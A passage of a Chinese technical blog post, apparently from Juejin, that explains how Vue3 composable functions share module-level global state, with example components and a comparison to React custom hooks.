      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"isLogin"</span>&gt;</span>欢迎 {{ user.name }} <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-else</span>&gt;</span>未登录<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"isLogin"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"logout"</span>&gt;</span>登出<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// 导入并调用组合式函数</span>
<span class="hljs-keyword">import</span> { useGlobalUser } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalUser'</span>;
<span class="hljs-keyword">const</span> { user, isLogin, logout } = <span class="hljs-title function_">useGlobalUser</span>();

<span class="hljs-comment">// 验证状态是否共享：组件渲染时打印（仅展示，无实际作用）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Header 组件渲染：'</span>, user.<span class="hljs-property">value</span>);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Login.vue 组件 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleLogin"</span>&gt;</span>模拟登录（张三）<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useGlobalUser } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalUser'</span>;
<span class="hljs-keyword">const</span> { login } = <span class="hljs-title function_">useGlobalUser</span>();

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 模拟接口返回的用户信息</span>
  <span class="hljs-title function_">login</span>({ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-attr">avatar</span>: <span class="hljs-string">'xxx.png'</span> });
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- App.vue 根组件 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">Login</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Header</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Header.vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Login</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Login.vue'</span>;
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-9">效果验证：</h4>
<ol>
<li>初始状态：Header 显示 “未登录”，控制台打印 <code>Header 组件渲染：null</code>；</li>
<li>点击 “模拟登录”：Login 组件调用 <code>login</code> 修改全局 <code>user</code> 状态；</li>
<li>自动同步：Header 组件因依赖 <code>user</code> 和 <code>isLogin</code>，会自动重新渲染，显示 “欢迎张三”，控制台打印 <code>Header 组件渲染：{ id: 1, name: '张三', ... }</code>；</li>
<li>点击 “登出”：<code>user</code> 状态重置为 <code>null</code>，Header 自动渲染 “未登录”。</li>
</ol>
<h4 data-id="heading-10">核心亮点：</h4>
<ul>
<li>无需手动维护订阅者：Vue3 响应式系统自动追踪依赖，状态更新时关联组件自动重渲染；</li>
<li>代码极简：相比 React 自定义 Hook 省去了 <code>notifySubscribers</code> 和 <code>forceUpdate</code> 逻辑。</li>
</ul>
<h3 data-id="heading-11">示例 2：优化版：支持初始化配置与状态隔离</h3>
<p>基础版仅支持单一状态，优化版可实现：1）初始化时传入默认值；2）通过 <code>key</code> 隔离多组同类状态（如多用户场景）。</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-ini" lang="ini">// useGlobalState.js（通用全局状态组合式函数）
import { ref, reactive, isRef, unref } from 'vue'<span class="hljs-comment">;</span>

// 模块缓存：存储不同 key 对应的全局状态
const <span class="hljs-attr">globalStateMap</span> = new Map()<span class="hljs-comment">;</span>
// 模块缓存：存储不同 key 对应的初始化配置
const <span class="hljs-attr">initConfigMap</span> = new Map()<span class="hljs-comment">;</span>

/**
 * 通用全局状态组合式函数
 * @param {string} key - 状态唯一标识（用于隔离不同状态）
 * @param {any} initialValue - 初始值（支持普通值或响应式对象）
 * @returns {<span class="hljs-section">[ref/reactive, function]</span>} - <span class="hljs-section">[状态, 更新函数]</span>
 */
export function useGlobalState(key, initialValue) {
  // 若状态已存在，直接返回缓存的实例
  if (globalStateMap.has(key)) {
    return globalStateMap.get(key)<span class="hljs-comment">;</span>
  }

  // 初始化响应式状态：根据初始值类型选择 ref 或 reactive
  const <span class="hljs-attr">state</span> = isRef(initialValue) 
    ? initialValue 
    : (typeof <span class="hljs-attr">initialValue</span> === <span class="hljs-string">'object'</span> &amp;&amp; initialValue !== null) 
      ? reactive(initialValue) 
      : ref(initialValue)<span class="hljs-comment">;</span>

  // 保存初始化配置（便于后续重置）
  initConfigMap.set(key, initialValue)<span class="hljs-comment">;</span>

  // 更新函数：支持直接赋值或函数式更新
  const <span class="hljs-attr">setState</span> = (updater) =&gt; {
    if (typeof <span class="hljs-attr">updater</span> === <span class="hljs-string">'function'</span>) {
      // 函数式更新：接收当前状态，返回新状态
      const <span class="hljs-attr">newValue</span> = updater(unref(state))<span class="hljs-comment">;</span>
      Object.assign(state, newValue)<span class="hljs-comment">; // reactive 直接合并</span>
      // 若为 ref，直接赋值：<span class="hljs-attr">state.value</span> = newValue
      if (isRef(state)) <span class="hljs-attr">state.value</span> = newValue<span class="hljs-comment">;</span>
    } else {
      // 直接赋值
      Object.assign(state, updater)<span class="hljs-comment">;</span>
      if (isRef(state)) <span class="hljs-attr">state.value</span> = updater<span class="hljs-comment">;</span>
    }
  }<span class="hljs-comment">;</span>

  // 重置函数：恢复到初始值
  const <span class="hljs-attr">resetState</span> = () =&gt; {
    const <span class="hljs-attr">initialValue</span> = initConfigMap.get(key)<span class="hljs-comment">;</span>
    setState(initialValue)<span class="hljs-comment">;</span>
  }<span class="hljs-comment">;</span>

  // 缓存状态和方法（key 作为唯一标识）
  const <span class="hljs-attr">result</span> = [state, setState, resetState]<span class="hljs-comment">;</span>
  globalStateMap.set(key, result)<span class="hljs-comment">;</span>

  return result<span class="hljs-comment">;</span>
}
</code></pre>
<h4 data-id="heading-12">使用方式：多状态隔离与灵活更新</h4>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 组件A：使用用户状态 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useGlobalState } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalState'</span>;

<span class="hljs-comment">// 初始化用户状态（key: 'user'，初始值：null）</span>
<span class="hljs-keyword">const</span> [user, setUser, resetUser] = <span class="hljs-title function_">useGlobalState</span>(<span class="hljs-string">'user'</span>, <span class="hljs-literal">null</span>);

<span class="hljs-comment">// 直接赋值更新</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">setUser</span>({ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span> });
};

<span class="hljs-comment">// 函数式更新（依赖当前状态）</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateName</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">setUser</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ ...prev, <span class="hljs-attr">name</span>: <span class="hljs-string">'张三-更新'</span> }));
};

<span class="hljs-comment">// 重置到初始值（null）</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReset</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">resetUser</span>();
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 组件B：使用主题状态（与用户状态隔离） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useGlobalState } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalState'</span>;

<span class="hljs-comment">// 初始化主题状态（key: 'theme'，初始值：{ mode: 'light' }）</span>
<span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useGlobalState</span>(<span class="hljs-string">'theme'</span>, { <span class="hljs-attr">mode</span>: <span class="hljs-string">'light'</span> });

<span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleTheme</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">setTheme</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ <span class="hljs-attr">mode</span>: prev.<span class="hljs-property">mode</span> === <span class="hljs-string">'light'</span> ? <span class="hljs-string">'dark'</span> : <span class="hljs-string">'light'</span> }));
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 组件C：共享用户状态（与组件A共用同一个 state） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useGlobalState } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalState'</span>;

<span class="hljs-comment">// 无需重新初始化，直接获取 key: 'user' 的缓存状态</span>
<span class="hljs-keyword">const</span> [user] = <span class="hljs-title function_">useGlobalState</span>(<span class="hljs-string">'user'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'组件C共享的用户状态：'</span>, user.<span class="hljs-property">value</span>); <span class="hljs-comment">// 与组件A的 user 完全一致</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-13">优化点说明：</h4>
<ul>
<li>支持多状态隔离：通过 <code>key</code> 区分不同全局状态（如 <code>user</code>/<code>theme</code>），避免冲突；</li>
<li>自适应响应式类型：自动根据初始值类型选择 <code>ref</code> 或 <code>reactive</code>，兼容基本类型和对象；</li>
<li>支持函数式更新和重置：满足复杂状态更新场景，便于状态回溯。</li>
</ul>
<h3 data-id="heading-14">示例 3：进阶版：支持异步状态与依赖注入</h3>
<p>在实际开发中，全局状态常需要异步初始化（如从接口获取用户信息），且可能需要通过依赖注入（Provide/Inject）实现跨层级组件共享（避免深层导入）。</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-ini" lang="ini">// useGlobalAuth.js（异步+依赖注入的全局状态）
import { ref, computed, provide, inject, onMounted } from 'vue'<span class="hljs-comment">;</span>

// 注入标识（避免命名冲突）
const <span class="hljs-attr">GLOBAL_AUTH_KEY</span> = Symbol(<span class="hljs-string">'GLOBAL_AUTH'</span>)<span class="hljs-comment">;</span>

// 模块级响应式状态（异步初始化）
const <span class="hljs-attr">user</span> = ref(null)<span class="hljs-comment">;</span>
const <span class="hljs-attr">loading</span> = ref(<span class="hljs-literal">true</span>)<span class="hljs-comment">; // 加载状态</span>
const <span class="hljs-attr">error</span> = ref(null)<span class="hljs-comment">; // 错误状态</span>
const <span class="hljs-attr">isLogin</span> = computed(() =&gt; !!user.value)<span class="hljs-comment">;</span>

// 异步初始化：从接口获取用户信息（如刷新页面后恢复登录状态）
const <span class="hljs-attr">fetchUserInfo</span> = async () =&gt; {
  try {
    <span class="hljs-attr">loading.value</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
    // 模拟接口请求
    const <span class="hljs-attr">res</span> = await fetch(<span class="hljs-string">'/api/user/info'</span>)<span class="hljs-comment">;</span>
    const <span class="hljs-attr">data</span> = await res.json()<span class="hljs-comment">;</span>
    <span class="hljs-attr">user.value</span> = data<span class="hljs-comment">;</span>
  } catch (err) {
    <span class="hljs-attr">error.value</span> = err.message<span class="hljs-comment">;</span>
  } finally {
    <span class="hljs-attr">loading.value</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
  }
}<span class="hljs-comment">;</span>

// 操作方法
const <span class="hljs-attr">login</span> = async (username, password) =&gt; {
  <span class="hljs-attr">loading.value</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
  try {
    const <span class="hljs-attr">res</span> = await fetch(<span class="hljs-string">'/api/login'</span>, {
      method: 'POST',
      body: JSON.stringify({ username, password })
    })<span class="hljs-comment">;</span>
    const <span class="hljs-attr">data</span> = await res.json()<span class="hljs-comment">;</span>
    <span class="hljs-attr">user.value</span> = data.user<span class="hljs-comment">;</span>
    return data<span class="hljs-comment">;</span>
  } catch (err) {
    <span class="hljs-attr">error.value</span> = err.message<span class="hljs-comment">;</span>
    throw err<span class="hljs-comment">;</span>
  } finally {
    <span class="hljs-attr">loading.value</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
  }
}<span class="hljs-comment">;</span>

const <span class="hljs-attr">logout</span> = async () =&gt; {
  await fetch('/api/logout')<span class="hljs-comment">;</span>
  <span class="hljs-attr">user.value</span> = null<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

// 父组件提供全局状态（如 App.vue 中使用）
export function provideGlobalAuth() {
  // 组件挂载时初始化用户信息
  onMounted(() =&gt; {
    fetchUserInfo()<span class="hljs-comment">;</span>
  })<span class="hljs-comment">;</span>

  // 提供状态和方法（子组件通过 inject 获取）
  provide(GLOBAL_AUTH_KEY, {
    user,
    isLogin,
    loading,
    error,
    login,
    logout
  })<span class="hljs-comment">;</span>
}

// 子组件注入全局状态
export function useGlobalAuth() {
  const <span class="hljs-attr">auth</span> = inject(GLOBAL_AUTH_KEY)<span class="hljs-comment">;</span>
  if (!auth) {
    throw new Error('useGlobalAuth 必须在 provideGlobalAuth 的后代组件中使用')<span class="hljs-comment">;</span>
  }
  return auth<span class="hljs-comment">;</span>
}
</code></pre>
<h4 data-id="heading-15">使用方式：依赖注入跨层级共享</h4>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- App.vue（根组件提供状态） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { provideGlobalAuth } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalAuth'</span>;
<span class="hljs-comment">// 提供全局状态（仅需在根组件调用一次）</span>
<span class="hljs-title function_">provideGlobalAuth</span>();
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span> /&gt;</span> <span class="hljs-comment">&lt;!-- 所有子组件均可注入使用 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 深层子组件（无需导入，直接注入） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"loading"</span>&gt;</span>加载中...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-else-if</span>=<span class="hljs-string">"error"</span>&gt;</span>错误：{{ error }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-else</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"isLogin"</span>&gt;</span>欢迎 {{ user.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">v-else</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleLogin"</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useGlobalAuth } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalAuth'</span>;
<span class="hljs-keyword">const</span> { user, isLogin, loading, error, login } = <span class="hljs-title function_">useGlobalAuth</span>();

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">login</span>(<span class="hljs-string">'admin'</span>, <span class="hljs-string">'123456'</span>);
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-16">进阶特性：</h4>
<ul>
<li>异步状态管理：内置 <code>loading</code>/<code>error</code> 状态，适配接口请求场景；</li>
<li>依赖注入：避免深层组件重复导入组合式函数，简化代码结构；</li>
<li>模块级缓存：异步请求仅执行一次（模块初始化时），所有组件共享请求结果。</li>
</ul>
<h2 data-id="heading-17">四、关键疑问解答：每次引入组合式函数，状态会重新初始化吗？</h2>
<p>结合示例和原理，我们详细解答这个核心问题：</p>
<h3 data-id="heading-18">1. 结论：不会重新初始化，仅函数逻辑重复执行</h3>
<ul>
<li><strong>响应式状态的初始化：仅执行一次</strong>：模块内的 <code>user = ref(null)</code>、<code>globalStateMap = new Map()</code> 等变量存储在<strong>模块作用域</strong>中，模块首次导入时会执行一次初始化，创建响应式对象实例；后续所有组件导入该模块并调用组合式函数时，不会重新创建这些变量，因此响应式状态的初始化仅执行一次。</li>
<li><strong>组合式函数的执行：每次组件调用都会执行</strong>：组件每次渲染（或初始化）时，调用组合式函数（如 <code>useGlobalUser()</code>）会重复执行函数内部的逻辑，但函数返回的是模块缓存的同一个响应式对象（<code>ref</code>/<code>reactive</code> 实例）—— 因此状态引用不变，不会触发不必要的更新。</li>
</ul>
<h3 data-id="heading-19">2. 代码验证：打印日志看执行次数</h3>
<p>修改 <code>useGlobalUser.js</code>，添加日志验证：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// useGlobalUser.js</span>
<span class="hljs-keyword">import</span> { ref, computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'模块初始化：仅执行一次'</span>); <span class="hljs-comment">// 模块首次导入时打印</span>

<span class="hljs-comment">// 模块级响应式状态（仅初始化一次）</span>
<span class="hljs-keyword">const</span> user = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'响应式状态初始化：仅执行一次'</span>); <span class="hljs-comment">// 模块首次导入时打印</span>

<span class="hljs-keyword">const</span> isLogin = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> !!user.<span class="hljs-property">value</span>);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useGlobalUser</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'组合式函数执行：组件调用时执行'</span>); <span class="hljs-comment">// 组件每次调用都会打印</span>
  <span class="hljs-keyword">return</span> { user, isLogin };
}
</code></pre>
<h4 data-id="heading-20">日志输出结果：</h4>
<ol>
<li>应用启动时（模块首次导入）：打印 <code>模块初始化：仅执行一次</code> → <code>响应式状态初始化：仅执行一次</code>；</li>
<li>第一个组件（如 Header）调用时：打印 <code>组合式函数执行：组件调用时执行</code>；</li>
<li>第二个组件（如 Login）调用时：打印 <code>组合式函数执行：组件调用时执行</code>（无 “响应式状态初始化” 日志）；</li>
<li>组件重渲染时（如登录后）：两个组件都会打印 <code>组合式函数执行：组件调用时执行</code>（仍无 “响应式状态初始化” 日志）。</li>
</ol>
<h4 data-id="heading-21">结论验证：</h4>
<ul>
<li>模块初始化和响应式状态创建仅执行一次（状态不会重新初始化）；</li>
<li>组合式函数本身会在组件每次调用时执行，但仅返回缓存的响应式对象，无额外性能开销。</li>
</ul>
<h3 data-id="heading-22">3. 与 Vue3 局部组合式函数的区别</h3>






























<table><thead><tr><th>特性</th><th>局部组合式函数（如 useLocalCounter）</th><th>全局组合式函数（如 useGlobalUser）</th></tr></thead><tbody><tr><td>状态存储位置</td><td>组件实例的 setup 作用域中</td><td>模块作用域的闭包中</td></tr><tr><td>状态共享性</td><td>组件私有（每个组件调用创建独立状态）</td><td>跨组件共享（所有组件调用共享同一状态）</td></tr><tr><td>响应式状态初始化次数</td><td>每个组件调用一次</td><td>模块初始化时仅一次</td></tr><tr><td>函数执行次数</td><td>组件每次渲染执行</td><td>组件每次调用执行（仅返回缓存）</td></tr></tbody></table>
<h2 data-id="heading-23">五、Vue3 组合式函数 vs React 自定义 Hook：全局状态实现差异</h2>



































<table><thead><tr><th>对比维度</th><th>Vue3 组合式函数</th><th>React 自定义 Hook</th></tr></thead><tbody><tr><td>响应式基础</td><td>基于 Proxy 的独立响应式系统（不依赖组件）</td><td>基于组件 Hook 链表（依赖组件实例）</td></tr><tr><td>订阅机制</td><td>自动依赖追踪（无需手动维护订阅者）</td><td>需手动维护订阅者或 forceUpdate</td></tr><tr><td>代码简洁度</td><td>极简（直接返回响应式对象）</td><td>需额外处理订阅和更新触发</td></tr><tr><td>状态类型支持</td><td>自动适配 ref（基本类型）/reactive（对象）</td><td>统一用 useState（需手动浅拷贝对象）</td></tr><tr><td>SSR 兼容性</td><td>需额外处理（模块状态会共享给所有请求）</td><td>同样需额外处理（状态污染问题）</td></tr></tbody></table>
<p>核心差异：Vue3 的响应式系统 “脱离” 组件实例，使得模块级全局状态的实现更自然、代码更简洁；而 React 需通过闭包 “脱离” 组件 Hook 链表，且需手动处理组件重渲染触发。</p>
<h2 data-id="heading-24">六、适用场景与局限性</h2>
<h3 data-id="heading-25">1. 适用场景</h3>
<ul>
<li>中小型应用或大型应用的非核心状态（如用户信息、主题、权限、全局通知、加载状态）；</li>
<li>不需要复杂中间件、状态回溯、时间旅行等高级特性；</li>
<li>追求轻量化、无额外依赖（无需引入 Pinia/Vuex）；</li>
<li>跨组件共享简单响应式状态，或需要复用异步逻辑（如接口请求 + 状态管理）。</li>
</ul>
<h3 data-id="heading-26">2. 局限性</h3>
<ul>
<li><strong>SSR 状态污染风险</strong>：模块级状态在 SSR 中会被所有请求共享（因为 SSR 是多请求复用一个模块实例），导致不同用户看到他人的状态 —— 需通过 <code>serverPrefetch</code> 或状态隔离机制解决；</li>
<li><strong>缺乏状态调试工具</strong>：没有 Pinia DevTools 那样的可视化调试工具，难以追踪状态变更历史；</li>
<li><strong>复杂状态逻辑维护成本高</strong>：若需状态依赖、批量更新、异步流控制（如请求取消），需手动实现，不如 Pinia/Vuex 的内置能力完善；</li>
<li><strong>状态持久化需手动处理</strong>：刷新页面后状态会丢失，需手动结合 <code>localStorage</code>/<code>sessionStorage</code> 实现持久化；</li>
<li><strong>多团队协作冲突风险</strong>：无统一的状态命名规范时，可能出现 <code>key</code> 冲突（如多个团队同时使用 <code>user</code> 作为状态 key）。</li>
</ul>
<h2 data-id="heading-27">七、总结</h2>
<p>Vue3 组合式函数之所以能轻松实现模块级全局状态，核心是<strong>模块作用域的闭包缓存 + 响应式系统的独立性</strong>：模块初始化时创建的响应式对象（<code>ref</code>/<code>reactive</code>）被缓存，所有组件调用组合式函数时共享同一个实例，且响应式系统自动追踪依赖，状态更新时关联组件自动重渲染。</p>
<p>每次引入组合式函数后，响应式状态不会重新初始化（仅模块首次导入时执行一次），函数逻辑的重复执行仅为返回缓存实例，无性能开销。</p>
<p>这种方案的优势是<strong>轻量化、易实现、代码简洁</strong>，适合简单全局状态场景；若项目需复杂状态管理（如多模块状态、调试、SSR 兼容），则推荐使用 Vue 官方推荐的 Pinia（本质是基于组合式函数 + 模块作用域实现的成熟方案）。</p>
<p>理解组合式函数的全局状态原理，不仅能帮助我们灵活应对不同场景，更能深入掌握 Vue3 的模块机制、响应式系统和组合式 API 设计理念，提升 Vue3 开发的底层认知。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 自定义 Hook：能否作为模块级全局状态管理？]]></title>    <link>https://juejin.cn/post/7575887863796924426</link>    <guid>https://juejin.cn/post/7575887863796924426</guid>    <pubDate>2025-11-24T06:43:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575887863796924426" data-draft-id="7575887863796793354" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 自定义 Hook：能否作为模块级全局状态管理？"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T06:43:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="三小河"/> <meta itemprop="url" content="https://juejin.cn/user/4222562141210478"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 自定义 Hook：能否作为模块级全局状态管理？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4222562141210478/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    三小河
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:43:15.000Z" title="Mon Nov 24 2025 06:43:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
